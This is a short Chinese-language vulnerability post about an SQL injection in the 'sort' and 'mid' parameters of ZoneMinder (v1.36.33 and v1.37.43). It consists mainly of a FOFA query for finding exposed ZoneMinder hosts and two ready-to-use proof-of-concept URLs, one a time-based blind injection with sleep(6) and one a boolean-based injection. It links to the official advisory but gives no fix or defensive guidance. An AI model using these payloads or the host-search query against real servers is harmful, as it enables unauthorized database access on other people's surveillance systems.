# ZoneMinder系统sort接口存在SQL注入漏洞

Zoneminder v1.36.33 和 v1.37.43 受到 SQL 注入漏洞的影响。

## fofa

```javascript
app="ZoneMinder"
```

## poc

```java
http://host:port/zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1
```

```java
http://host:port/zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031011914.png)

## 漏洞来源

- https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-9cmr-7437-v9fj
